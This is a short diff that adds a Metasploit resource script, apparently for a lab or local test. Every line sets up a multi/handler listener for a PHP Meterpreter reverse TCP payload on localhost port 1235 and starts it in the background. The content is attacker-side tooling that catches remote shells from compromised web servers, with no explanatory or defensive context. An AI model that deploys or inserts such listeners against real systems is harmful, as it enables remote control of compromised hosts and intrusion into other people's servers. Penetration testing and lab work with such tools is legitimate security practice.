@@ -1,0 +1,5 @@
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 127.0.0.1
+set lport 1235
+exploit -j
